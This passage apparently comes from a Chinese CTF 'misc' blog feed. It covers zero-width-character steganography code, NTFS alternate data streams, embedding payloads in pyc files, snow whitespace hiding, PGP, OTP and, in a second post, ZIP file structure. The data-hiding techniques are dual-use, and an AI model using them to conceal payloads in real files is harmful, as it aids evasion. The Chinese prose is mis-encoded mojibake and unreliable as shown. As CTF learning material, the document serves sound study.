&#125;else&#123;</span><br><span class="hljs-comment">        result.push(c2.shift());</span><br><span class="hljs-comment">      &#125;</span><br><span class="hljs-comment">    &#125;*/</span><br>    i = <span class="hljs-number">0</span>;<br>    j = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>((i &lt; c1.<span class="hljs-property">length</span>) &amp;&amp; (j &lt; c2.<span class="hljs-property">length</span>))&#123;<br>      <span class="hljs-keyword">if</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() &lt;= ratio)&#123;<br>        result.<span class="hljs-title function_">push</span>(c1[i]);<br>        i++;<br>      &#125;<span class="hljs-keyword">else</span>&#123;<br>        result.<span class="hljs-title function_">push</span>(c2[j]);<br>        j++;<br>      &#125;<br>    &#125;<br>    c1 = c1.<span class="hljs-title function_">slice</span>(i);<br>    c2 = c2.<span class="hljs-title function_">slice</span>(j);<br><br>    result = result.<span class="hljs-title function_">concat</span>(c1).<span class="hljs-title function_">concat</span>(c2);<br><br>    <span class="hljs-keyword">return</span> result.<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br>  &#125;;<br>  <span class="hljs-keyword">var</span> split_zerowidth_characters = <span class="hljs-keyword">function</span>(<span class="hljs-params">str1</span>)&#123;<br>    <span class="hljs-keyword">var</span> result = &#123;&#125;;<br>    result.<span class="hljs-property">originalText</span> = str1.<span class="hljs-title function_">replace</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(<span class="hljs-string">&#x27;[&#x27;</span> + chars.<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;&#x27;</span>) + <span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-string">&#x27;g&#x27;</span>), <span class="hljs-string">&#x27;&#x27;</span>);<br>    result.<span class="hljs-property">hiddenText</span> = str1.<span class="hljs-title function_">replace</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(<span class="hljs-string">&#x27;[^&#x27;</span> + chars.<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;&#x27;</span>) + <span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-string">&#x27;g&#x27;</span>), <span class="hljs-string">&#x27;&#x27;</span>);<br><br>    <span class="hljs-keyword">return</span> result;<br>  &#125;;<br>  <span class="hljs-keyword">var</span> decode_from_zero_width_characters_text = <span class="hljs-keyword">function</span>(<span class="hljs-params">str1</span>)&#123;<br>    <span class="hljs-keyword">var</span> r = str1;<br>    <span class="hljs-keyword">var</span> i;<br>    <span class="hljs-keyword">var</span> result = [];<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; radix; i++)&#123;<br>      r = r.<span class="hljs-title function_">replace</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(chars[i], <span class="hljs-string">&#x27;g&#x27;</span>), i);<br>    &#125;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; r.<span class="hljs-property">length</span>; i += codelengthText)&#123;<br>      result.<span class="hljs-title function_">push</span>(<span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(<span class="hljs-built_in">parseInt</span>(r.<span class="hljs-title function_">substr</span>(i, codelengthText), radix)));<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> result.<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br>  &#125;;<br>  <span class="hljs-keyword">var</span> decode_from_zero_width_characters_binary = <span class="hljs-keyword">function</span>(<span class="hljs-params">str1</span>)&#123;<br>    <span class="hljs-keyword">var</span> r = str1;<br>    <span class="hljs-keyword">var</span> i;<br>    <span class="hljs-keyword">var</span> j;<br>    <span class="hljs-keyword">var</span> result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">ceil</span>(str1.<span class="hljs-property">length</span> / codelengthBinary));<br><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; radix; i++)&#123;<br>      r = r.<span class="hljs-title function_">replace</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(chars[i], <span class="hljs-string">&#x27;g&#x27;</span>), i);<br>    &#125;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>; i &lt; r.<span class="hljs-property">length</span>; i += codelengthBinary, j++)&#123;<br>      result[j] = <span class="hljs-built_in">parseInt</span>(r.<span class="hljs-title function_">substr</span>(i, codelengthBinary), radix);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> result;<br>  &#125;;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;)(<span class="hljs-variable language_">this</span>);<br><br><br><span class="hljs-keyword">var</span> s = unicodeSteganographer<br>s.<span class="hljs-title function_">setUseChars</span>(<span class="hljs-string">&#x27;\u200b\u200c\u200d\u200e\u200f&#x27;</span>);<br>s.<span class="hljs-title function_">decodeText</span>(<span class="hljs-string">&quot;æˆ‘å·²ç»çœ‹è§äº†ï¼Œâ€‹â€‹â€‹â€‹â€â€â€‹â€‹â€‹â€‹â€‹â€â€‹â€â€‹â€‹â€‹â€‹â€â€â€Œâ€‹â€‹â€‹â€‹â€â€â€â€‹â€‹â€‹â€‹â€â€â€‹â€‹â€‹â€‹â€‹â€â€â€Œâ€‹â€‹â€‹â€‹â€â€â€Œâ€‹â€‹â€‹â€‹â€â€â€â€‹â€‹â€‹â€‹â€Œâ€Œâ€â€‹â€‹â€‹â€‹â€â€â€â€‹â€‹â€‹â€‹â€â€â€Œâ€‹â€‹â€‹â€‹â€â€â€‹â€‹â€‹â€‹â€‹â€â€‹â€â€‹â€‹â€‹â€‹â€â€â€â€‹â€‹â€‹â€‹â€â€â€â€‹â€‹â€‹â€‹â€â€â€Œâ€‹â€‹â€‹â€‹â€â€â€â€‹â€‹â€‹â€‹â€â€Œâ€â€‹â€‹â€‹â€‹â€â€â€â€‹â€‹â€‹â€‹â€â€â€Œâ€‹â€‹â€‹â€‹â€â€‹â€Œâ€‹â€‹â€‹â€Œâ€‹â€‹â€‹ä½ å‘¢ï¼Ÿ&quot;</span>)<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">* å¤åˆ¶å¹¶ä½¿ç”¨ä»£ç è¯·æ³¨æ˜å¼•ç”¨å‡ºå¤„å“¦~</span><br><span class="hljs-comment">* Lazzaro @ https://lazzzaro.github.io</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure>

<h2 id="0x02-ntfsæ•°æ®æµéšå†™"><a href="#0x02-ntfsæ•°æ®æµéšå†™" class="headerlink" title="0x02 ntfsæ•°æ®æµéšå†™"></a>0x02 ntfsæ•°æ®æµéšå†™</h2><blockquote>
<p>NTFSäº¤æ¢æ•°æ®æµï¼ˆalternate data streamsï¼Œç®€ç§°ADSï¼‰æ˜¯NTFSç£ç›˜æ ¼å¼çš„ä¸€ä¸ªç‰¹æ€§ï¼Œåœ¨NTFSæ–‡ä»¶ç³»ç»Ÿä¸‹ï¼Œæ¯ä¸ªæ–‡ä»¶éƒ½å¯ä»¥å­˜åœ¨å¤šä¸ªæ•°æ®æµï¼Œå°±æ˜¯è¯´é™¤äº†ä¸»æ–‡ä»¶æµä¹‹å¤–è¿˜å¯ä»¥æœ‰è®¸å¤šéä¸»æ–‡ä»¶æµå¯„å®¿åœ¨ä¸»æ–‡ä»¶æµä¸­ã€‚å®ƒä½¿ç”¨èµ„æºæ´¾ç”Ÿæ¥ç»´æŒä¸æ–‡ä»¶ç›¸å…³çš„ä¿¡æ¯ã€‚â€”â€”â€”â€”ç™¾åº¦ç™¾ç§‘</p>
</blockquote>
<p>åˆ›å»ºä¸€ä¸ªNTFSæ•°æ®æµ<br><code>echo &quot;test&quot; &gt; 1.txt:2.txt</code></p>
<p>æŸ¥çœ‹æ•°æ®æµ<br>ä½¿ç”¨<code>NtfsStreamsEditor</code>(windows)å·¥å…·æˆ–è€…<code>notepad</code>å‘½ä»¤</p>
<p><img src="/img/summary/misc/ntfs.jpg"></p>
<h2 id="0x03-pycæ–‡ä»¶åç¼–è¯‘"><a href="#0x03-pycæ–‡ä»¶åç¼–è¯‘" class="headerlink" title="0x03 pycæ–‡ä»¶åç¼–è¯‘"></a>0x03 pycæ–‡ä»¶åç¼–è¯‘</h2><p>ä¸€èˆ¬ä½¿ç”¨<code>uncompyle6</code></p>
<p><code>uncompyle6 test.pyc &gt; test.py</code></p>
<h2 id="0x04-pycéšå†™"><a href="#0x04-pycéšå†™" class="headerlink" title="0x04 pycéšå†™"></a>0x04 pycéšå†™</h2><p>Stegosaurus æ˜¯ä¸€æ¬¾éšå†™å·¥å…·ï¼Œå®ƒå…è®¸æˆ‘ä»¬åœ¨ Python å­—èŠ‚ç æ–‡ä»¶( pyc æˆ– pyo )ä¸­åµŒå…¥ä»»æ„ Payload</p>
<p>githubé¡¹ç›®è¯´æ˜¯<code>Python 3.6 or later</code>ï¼Œä½†æ˜¯å®é™…ä½¿ç”¨å‘ç°åªæœ‰Python3.6å¯ä»¥è¿è¡Œ</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">python3 stegosaurus.py -x [pyc_file]<br></code></pre></td></tr></table></figure>

<p>æœ‰æ—¶å€™éœ€è¦æ³¨æ„<code>magic number</code>çš„é—®é¢˜<br>python3.6ä»¥ä¸‹magic numberæ˜¯12ä¸ªå­—èŠ‚ï¼›python3.7ä»¥ä¸Šæ˜¯16ä¸ªå­—èŠ‚</p>
<h2 id="0x05-Tupperè‡ªæˆ‘æŒ‡æ¶‰å…¬å¼"><a href="#0x05-Tupperè‡ªæˆ‘æŒ‡æ¶‰å…¬å¼" class="headerlink" title="0x05 Tupperè‡ªæˆ‘æŒ‡æ¶‰å…¬å¼"></a>0x05 Tupperè‡ªæˆ‘æŒ‡æ¶‰å…¬å¼</h2><p>å¡”ç€è‡ªæŒ‡å…¬å¼æ˜¯æ°å¤«Â·å¡”ç€ï¼ˆJeff Tupperï¼‰å‘ç°çš„è‡ªæŒ‡å…¬å¼ï¼šæ­¤å…¬å¼çš„äºŒç»´å›¾åƒä¸å…¬å¼æœ¬èº«å¤–è§‚ä¸€æ ·ã€‚<br>è¯¥å…¬å¼æ˜¯ä¸€ç§å¯¹å­˜å‚¨åœ¨å¸¸é‡k ä¸­çš„ä½å›¾ä¿¡æ¯è¿›è¡Œè§£ç çš„é€šç”¨æ–¹æ³• ï¼Œå®ƒå®é™…ä¸Šå¯ä»¥ç”¨æ¥ç»˜åˆ¶ä»»ä½•å…¶ä»–å›¾åƒã€‚</p>
<p>è¯¥ä¸ç­‰å¼çš„å®šä¹‰ä¸ºï¼š<br><img src="/img/summary/misc/Tupper.jpg"><br>å…¶ä¸­ âŒŠ âŒ‹ è¡¨ç¤ºæ¥¼å±‚å‡½æ•°ï¼Œ mod æ˜¯æ¨¡è¿ç®—</p>
<p>æ ¹æ®kå€¼ä¸åŒï¼Œå¯ä»¥åšå‡ºâ€ä»»æ„â€å›¾åƒ</p>
<p><a href="https://tuppers-formula.ovh/">Tupperâ€™s Formula Tools</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> reduce<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Tuppers_Self_Referential_Formula</span>():<br>    k = <span class="hljs-number">4858450636189713423582095962494202044581400587983244549483093085061934704708809928450644769865524364849997247024915119110411605739177407856919754326571855442057210445735883681829823754139634338225199452191651284348332905131193199953502413758765239264874613394906870130562295813219481113685339535565290850023875092856892694555974281546386510730049106723058933586052544096664351265349363643957125565695936815184334857605266940161251266951421550539554519153785457525756590740540157929001765967965480064427829131488548259914721248506352686630476300</span><br>    <span class="hljs-comment"># è¿™é‡Œæ›¿æ¢ä¸ºä½ è‡ªå·±çš„Kå€¼</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">f</span>(<span class="hljs-params">x, y</span>):<br>        d = ((-<span class="hljs-number">17</span> * x) - (y % <span class="hljs-number">17</span>))<br>        e = reduce(<span class="hljs-keyword">lambda</span> x, y: x * y, [<span class="hljs-number">2</span> <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(-d)]) <span class="hljs-keyword">if</span> d <span class="hljs-keyword">else</span> <span class="hljs-number">1</span><br>        g = ((y // <span class="hljs-number">17</span>) // e) % <span class="hljs-number">2</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0.5</span> &lt; g<br><br>    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(k + <span class="hljs-number">16</span>, k - <span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<br>        line = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">107</span>):<br>            <span class="hljs-keyword">if</span> f(x, y):<br>                line += <span class="hljs-string">&quot; â– &quot;</span><br>            <span class="hljs-keyword">else</span>:<br>                line += <span class="hljs-string">&quot;  &quot;</span><br>        <span class="hljs-built_in">print</span>(line)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    Tuppers_Self_Referential_Formula()<br></code></pre></td></tr></table></figure>


<h2 id="0x06-snowéšå†™"><a href="#0x06-snowéšå†™" class="headerlink" title="0x06 snowéšå†™"></a>0x06 snowéšå†™</h2><p>snow éšå†™æ˜¯åœ¨htmlåµŒå…¥éšå†™ä¿¡æ¯ï¼Œå®ƒçš„åŸç†æ˜¯é€šè¿‡åœ¨æ–‡æœ¬æ–‡ä»¶çš„æœ«å°¾åµŒå…¥ç©ºæ ¼å’Œåˆ¶è¡¨ä½çš„æ–¹å¼åµŒå…¥éšè—ä¿¡æ¯ï¼Œä¸åŒç©ºæ ¼ä¸åˆ¶è¡¨ä½çš„ç»„åˆä»£è¡¨ä¸åŒçš„åµŒå…¥ä¿¡æ¯ã€‚</p>
<p>snowåŠ å¯†çš„ç‰¹å¾éå¸¸æ˜æ˜¾ï¼Œå®ƒä¼šç”Ÿæˆå¤§é‡çš„<code>20</code>ï¼Œ<code>09</code>ï¼Œåœ¨é¢„è§ˆçš„æ—¶å€™åƒé›ªèŠ±ä¸€æ ·</p>
<p><img src="/img/summary/misc/snow.png"></p>
<p><a href="http://fog.misty.com/perry/ccs/snow/snow/snow.html">snowåœ¨çº¿</a></p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">snow.exe -C -p password filename<br></code></pre></td></tr></table></figure>

<h2 id="0x07-whitespace"><a href="#0x07-whitespace" class="headerlink" title="0x07 whitespace"></a>0x07 whitespace</h2><p>white_spaceæ˜¯ä¸€ç§ç¼–ç¨‹è¯­è¨€<br>ç”±â€ç©ºæ ¼â€ï¼Œâ€å›è½¦â€ï¼Œâ€tabâ€ç»„æˆ</p>
<p><a href="https://vii5ard.github.io/whitespace/">whitespace ide</a></p>
<h2 id="0x08-PGP"><a href="#0x08-PGP" class="headerlink" title="0x08 PGP"></a>0x08 PGP</h2><blockquote>
<p>PGP åŠ å¯†ç³»ç»Ÿæ˜¯é‡‡ç”¨å…¬å¼€å¯†é’¥åŠ å¯†ä¸ä¼ ç»Ÿå¯†é’¥åŠ å¯†ç›¸ç»“åˆçš„ä¸€ç§åŠ å¯†æŠ€æœ¯ã€‚å®ƒä½¿ç”¨ä¸€å¯¹æ•°å­¦ä¸Šç›¸å…³çš„é’¥åŒ™ï¼Œå…¶ä¸­ä¸€ä¸ªï¼ˆå…¬é’¥ï¼‰ç”¨æ¥åŠ å¯†ä¿¡æ¯ï¼Œå¦ä¸€ä¸ªï¼ˆç§é’¥ï¼‰ç”¨æ¥è§£å¯†ä¿¡æ¯ã€‚</p>
</blockquote>
<p>ä¸€èˆ¬éœ€è¦ç§é’¥æ–‡ä»¶<code>xxx.key</code>æˆ–<code>xxx.asc</code>ï¼ŒåŠ å¯†æ–‡ä»¶<code>xxx.pgp</code>å’Œä¸€ä¸ªå¯†ç </p>
<p>PGPTool: <a href="https://pgptool.github.io/">https://pgptool.github.io/</a></p>
<p>ä¾‹å¦‚[BSidesSF2019]bWF0cnlvc2hrYQ&#x3D;&#x3D;</p>
<p><code>Key ring-&gt;Import PGP Key-&gt;å¯¼å…¥xxx.key-&gt;ç„¶åè¾“å…¥å¯†ç </code></p>
<p><img src="/img/summary/misc/pgp.jpg"></p>
<h2 id="0x09-otp"><a href="#0x09-otp" class="headerlink" title="0x09 otp"></a>0x09 otp</h2><p>æœ‰ç‚¹åå‘å¯†ç å­¦ï¼Œ<a href="https://en.wikipedia.org/wiki/One-time_password">wiki</a></p>
<p>ä¸€æ¬¡æ€§å¯†ç ï¼ˆOne Time Passwordï¼Œç®€ç§° OTPï¼‰ï¼Œåˆç§° â€œä¸€æ¬¡æ€§å£ä»¤â€ï¼Œæ˜¯æŒ‡åªèƒ½ä½¿ç”¨ä¸€æ¬¡çš„å¯†ç ã€‚</p>
<p>OTP çš„å¯†é’¥æ˜¯ä»¥ base32 çš„æ–¹å¼å­˜å‚¨çš„</p>
<p>pythonä¸­æœ‰ä¸€ä¸ª<a href="https://pypi.org/project/pyotp/">pyotpåº“</a>å¯ä»¥å¤„ç†å®ƒ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#Time-based OTPs</span><br><span class="hljs-keyword">import</span> pyotp<br><span class="hljs-keyword">import</span> time<br><br>totp = pyotp.TOTP(<span class="hljs-string">&#x27;base32secret3232&#x27;</span>)<br>totp.now() <span class="hljs-comment"># =&gt; &#x27;492039&#x27;</span><br><br><br>totp.verify(<span class="hljs-string">&#x27;492039&#x27;</span>) <span class="hljs-comment"># =&gt; True</span><br>time.sleep(<span class="hljs-number">30</span>)<br>totp.verify(<span class="hljs-string">&#x27;492039&#x27;</span>) <span class="hljs-comment"># =&gt; False</span><br><br><br><span class="hljs-comment">#Counter-based OTPs</span><br><span class="hljs-keyword">import</span> pyotp<br><br>hotp = pyotp.HOTP(<span class="hljs-string">&#x27;base32secret3232&#x27;</span>)<br>hotp.at(<span class="hljs-number">0</span>) <span class="hljs-comment"># =&gt; &#x27;260182&#x27;</span><br>hotp.at(<span class="hljs-number">1</span>) <span class="hljs-comment"># =&gt; &#x27;055283&#x27;</span><br>hotp.at(<span class="hljs-number">1401</span>) <span class="hljs-comment"># =&gt; &#x27;316439&#x27;</span><br><br>hotp.verify(<span class="hljs-string">&#x27;316439&#x27;</span>, <span class="hljs-number">1401</span>) <span class="hljs-comment"># =&gt; True</span><br>hotp.verify(<span class="hljs-string">&#x27;316439&#x27;</span>, <span class="hljs-number">1402</span>) <span class="hljs-comment"># =&gt; False</span><br><br><br><br><span class="hljs-comment">#Generating a Secret Key</span><br>pyotp.random_base32()<br>pyotp.random_hex()<br></code></pre></td></tr></table></figure>

<h2 id="0x10-æ•°æ§æ‰“å°"><a href="#0x10-æ•°æ§æ‰“å°" class="headerlink" title="0x10 æ•°æ§æ‰“å°"></a>0x10 æ•°æ§æ‰“å°</h2><p>é‡åˆ°<code>*.gcode</code>æ–‡ä»¶æˆ–è€…<code>3Dæ‰“å°gcodeçš„å‘½ä»¤</code>å¯ä»¥æ”¾åˆ°ä¸‹é¢è¿™ä¸¤ä¸ªç½‘ç«™è§£æ</p>
<p><a href="https://ncviewer.com/">ncviewer</a><br><a href="https://gcode.ws/">gCodeViewer</a></p>
<p><img src="/img/summary/misc/shukong.jpg"></p>
<h2 id="0x11-Dicomå›¾åƒ"><a href="#0x11-Dicomå›¾åƒ" class="headerlink" title="0x11 Dicomå›¾åƒ"></a>0x11 Dicomå›¾åƒ</h2><p>xå…‰å›¾åƒ</p>
<p>åç¼€ä¸º<code>.dcm</code>çš„æ–‡ä»¶å¯ä»¥ä½¿ç”¨<code>MicroDicom</code>æ‰“å¼€</p>
]]></content>
      <categories>
        <category>æ€»ç»“</category>
      </categories>
      <tags>
        <tag>misc</tag>
        <tag>æ€»ç»“</tag>
        <tag>éšå†™æœ¯</tag>
      </tags>
  </entry>
  <entry>
    <title>miscæ€»ç»“(å‹ç¼©æ–‡ä»¶ç¯‡)</title>
    <url>/posts/ff5ac082/</url>
    <content><![CDATA[<h1 id="ZIPæ–‡ä»¶"><a href="#ZIPæ–‡ä»¶" class="headerlink" title="ZIPæ–‡ä»¶"></a>ZIPæ–‡ä»¶</h1><p><code>ZIP</code>é€šå¸¸ä½¿ç”¨åç¼€å<code>.zip</code>ï¼Œå®ƒçš„<code>MIME</code>æ ¼å¼ä¸º<code>application/zip</code></p>
<h2 id="æ–‡ä»¶ç»“æ„åˆ†æ"><a href="#æ–‡ä»¶ç»“æ„åˆ†æ" class="headerlink" title="æ–‡ä»¶ç»“æ„åˆ†æ"></a>æ–‡ä»¶ç»“æ„åˆ†æ</h2><p>å¼•ç”¨<a href="https://pkware.cachefly.net/webdocs/APPNOTE/APPNOTE-6.2.0.txt">å®˜æ–¹æ–‡æ¡£</a>ä¸­å¯¹äºä¸€ä¸ªæ ‡å‡†zipæ–‡ä»¶ç»„æˆéƒ¨åˆ†çš„æè¿°ï¼š</p>
<figure class="highlight prolog"><table><tr><td class="code"><pre><code class="hljs prolog">[local file header <span class="hljs-number">1</span>]<br>[file data <span class="hljs-number">1</span>]<br>[data descriptor <span class="hljs-number">1</span>]<br>.<br>.<br>.<br>[local file header n]<br>[file data n]<br>[data descriptor n]<br>[archive decryption header] (<span class="hljs-symbol">EFS</span>)<br>[archive extra data record] (<span class="hljs-symbol">EFS</span>)<br>[central directory]<br>[zip64 end of central directory record]<br>[zip64 end of central directory locator]<br>[end of central directory record]<br></code></pre></td></tr></table></figure>

<p>ä¸ºäº†æ¼”ç¤ºç»“æ„ï¼Œé¦–å…ˆåˆ›å»ºä¸€ä¸ª<code>flag.txt</code>ï¼Œåˆ†åˆ«å‹ç¼©æˆ<code>flag1.zip(æ— å¯†ç )</code>å’Œ<code>flag2.zip(æœ‰å¯†ç )</code>ï¼ˆä½¿ç”¨çš„æ˜¯winraré»˜è®¤å‚æ•°å‹ç¼©ï¼‰</p>
<p>æ¨èä½¿ç”¨<code>010 editor</code>åˆ†æ</p>
<p>å…ˆçœ‹<code>flag1.zip</code></p>
<p><img src="/img/summary/misc/misc-compress-1.png"></p>
<p>å¤§è‡´å¯ä»¥åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†ï¼š<code>local file header + file data + data descriptor</code>å’Œ<code>central directory</code>ä»¥åŠä¸€ä¸ª<code>end of central directory record</code>ç»„æˆï¼ˆå¯¹åº”å›¾ä¸­çš„ä¸‰ç§é¢œè‰²ï¼‰</p>
<h3 id="æ–‡ä»¶å¤´-Local-file-header"><a href="#æ–‡ä»¶å¤´-Local-file-header" class="headerlink" title="æ–‡ä»¶å¤´(Local file header)"></a>æ–‡ä»¶å¤´(Local file header)</h3><table>
<thead>
<tr>
<th>å­—æ®µåç§°</th>
<th>é•¿åº¦(byte)</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>Local file header signature</td>
<td>4</td>
<td>æ–‡ä»¶å¤´æ ‡è¯†ï¼Œå›ºå®šå€¼(50 4B 03 04)</td>
</tr>
<tr>
<td>Version needed to extract</td>
<td>2</td>
<td>è§£å‹æ–‡ä»¶æ‰€éœ€çš„ZIPæœ€ä½ç‰ˆæœ¬</td>
</tr>
<tr>
<td>General purpose bit flag</td>
<td>2</td>
<td>é€šç”¨ä½æ ‡å¿—ï¼Œé€šå¸¸åªéœ€è¦è€ƒè™‘å½“bit 0ä¸º1æ—¶è¡¨ç¤ºæ–‡ä»¶è¢«åŠ å¯†</td>
</tr>
<tr>
<td>Compression method</td>
<td>2</td>
<td>å‹ç¼©æ–¹å¼ï¼Œå½“å€¼ä¸ºï¼š0x0000æ—¶è¡¨ç¤ºæ— å‹ç¼©</td>
</tr>
<tr>
<td>Last mod file time</td>
<td>2</td>
<td>æ–‡ä»¶æœ€åä¿®æ”¹æ—¶é—´ï¼Œä»¥standard MS-DOSæ ¼å¼ç¼–ç </td>
</tr>
<tr>
<td>Last mod file date</td>
<td>2</td>
<td>æ–‡ä»¶æœ€åä¿®æ”¹æ—¥æœŸ</td>
</tr>
<tr>
<td>CRC-32</td>
<td>4</td>
<td>æœªå‹ç¼©æ•°æ®çš„CRC32</td>
</tr>
<tr>
<td>Compressed size</td>
<td>4</td>
<td>å‹ç¼©åçš„å¤§å°ï¼Œå•ä½ä¸ºbyte</td>
</tr>
<tr>
<td>Uncompressed size</td>
<td>4</td>
<td>æœªå‹ç¼©çš„å¤§å°</td>
</tr>
<tr>
<td>File name length</td>
<td>2</td>
<td>æ–‡ä»¶åé•¿åº¦</td>
</tr>
<tr>
<td>Extra field length</td>
<td>2</td>
<td>æ‰©å±•åŒºåŸŸé•¿åº¦</td>
</tr>
<tr>
<td>File name</td>
<td>N</td>
<td>æ–‡ä»¶å</td>
</tr>
<tr>
<td>Extra field</td>
<td>N</td>
<td>æ‰©å±•åŒºåŸŸ</td>
</tr>
</tbody></table>
<h3 id="æ–‡ä»¶æ•°æ®-File-data"><a href="#æ–‡ä»¶æ•°æ®-File-data" class="headerlink" title="æ–‡ä»¶æ•°æ®(File data)"></a>æ–‡ä»¶æ•°æ®(File data)</h3><p>åº”å°†æ–‡ä»¶çš„å‹ç¼©æˆ–å­˜å‚¨æ•°æ®ç´§éšåœ¨æ–‡ä»¶å¤´(Local File Header)åã€‚å¦‚æœæ–‡ä»¶å·²åŠ å¯†ï¼Œåˆ™æ–‡ä»¶çš„åŠ å¯†å¤´(encryption header)åº”æ”¾ç½®åœ¨æœ¬åœ°æ–‡ä»¶å¤´(Local File Header)ä¹‹åå’Œæ–‡ä»¶æ•°æ®ä¹‹å‰ã€‚</p>
<p>å¯¹äº<code>.ZIP</code>å‹ç¼©æ–‡æ¡£ä¸­çš„æ¯ä¸ªæ–‡ä»¶ï¼Œé‡å¤æ‰§è¡Œä¸€ç³»åˆ—çš„<code>[æ–‡ä»¶å¤´][åŠ å¯†å¤´][æ–‡ä»¶æ•°æ®][æ•°æ®æè¿°ç¬¦]</code>ç»“æ„ã€‚</p>
<h3 id="æ•°æ®æè¿°ç¬¦-Data-descriptor"><a href="#æ•°æ®æè¿°ç¬¦-Data-descriptor" class="headerlink" title="æ•°æ®æè¿°ç¬¦(Data descriptor)"></a>æ•°æ®æè¿°ç¬¦(Data descriptor)</h3><table>
<thead>
<tr>
<th>å­—æ®µåç§°</th>
<th>é•¿åº¦(byte)</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>Optional data descriptor signature</td>
<td>4</td>
<td>(å¯é€‰çš„)æ•°æ®æè¿°ç¬¦æ ‡è¯†ï¼Œå›ºå®šå€¼(50 4B 07 08)</td>
</tr>
<tr>
<td>CRC-32</td>
<td>4</td>
<td>æœªå‹ç¼©æ•°æ®çš„CRC32</td>
</tr>
<tr>
<td>Compressed size</td>
<td>4</td>
<td>å‹ç¼©åçš„å¤§å°</td>
</tr>
<tr>
<td>Uncompressed size</td>
<td>4</td>
<td>æœªå‹ç¼©çš„å¤§å°</td>
</tr>
</tbody></table>
<p>å¦‚æœè®¾ç½®äº†é€šç”¨ä½æ ‡å¿—çš„ä½3ï¼Œåˆ™è¯¥æè¿°ç¬¦å¿…é¡»å­˜åœ¨ï¼Œå®ƒæŒ‰å­—èŠ‚å¯¹é½ï¼Œç´§éšå‹ç¼©æ•°æ®çš„æœ€åä¸€ä¸ªå­—èŠ‚ï¼Œä»…åœ¨æ— æ³•åœ¨è¾“å‡ºçš„.ZIPæ–‡ä»¶ä¸­æŸ¥æ‰¾æ—¶(ä¾‹å¦‚ï¼Œå½“è¾“å‡º.ZIPæ–‡ä»¶æ˜¯æ ‡å‡†è¾“å‡ºæˆ–ä¸å¯æœç´¢çš„è®¾å¤‡æ—¶)ï¼Œæ‰åº”ä½¿ç”¨æ­¤æè¿°ç¬¦</p>
<p>ä¾‹å¦‚<code>flag2.zip</code>ä¸­çš„ç»¿è‰²éƒ¨åˆ†</p>
<p><img src="/img/summary/misc/misc-compress-2.png"></p>
<h3 id="æ ¸å¿ƒç›®å½•-Central-directory"><a href="#æ ¸å¿ƒç›®å½•-Central-directory" class="headerlink" title="æ ¸å¿ƒç›®å½•(Central directory)"></a>æ ¸å¿ƒç›®å½•(Central directory)</h3><p><code>Central directory</code>åŒ…æ‹¬<code>File header</code>å’Œ<code>Digital signature</code></p>
<p>æ–‡ä»¶å¤´ï¼š</p>
<table>
<thead>
<tr>
<th>å­—æ®µåç§°</th>
<th>é•¿åº¦(byte)</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>Central directory file header signature</td>
<td>4</td>
<td>ä¸­å¿ƒç›®å½•æ–‡ä»¶å¤´æ ‡è¯†ï¼Œå›ºå®šå€¼(50 4B 01 02)</td>
</tr>
<tr>
<td>Version made by</td>
<td>2</td>
<td>å‹ç¼©æ‰€ç”¨çš„ZIPç‰ˆæœ¬</td>
</tr>
<tr>
<td>Version needed to extract</td>
<td>2</td>
<td>è§£å‹æ–‡ä»¶æ‰€éœ€çš„ZIPæœ€ä½ç‰ˆæœ¬</td>
</tr>
<tr>
<td>General purpose bit flag</td>
<td>2</td>
<td>é€šç”¨ä½æ ‡è®°</td>
</tr>
<tr>
<td>Compression method</td>
<td>2</td>
<td>å‹ç¼©æ–¹æ³•</td>
</tr>
<tr>
<td>Last mod file time</td>
<td>2</td>
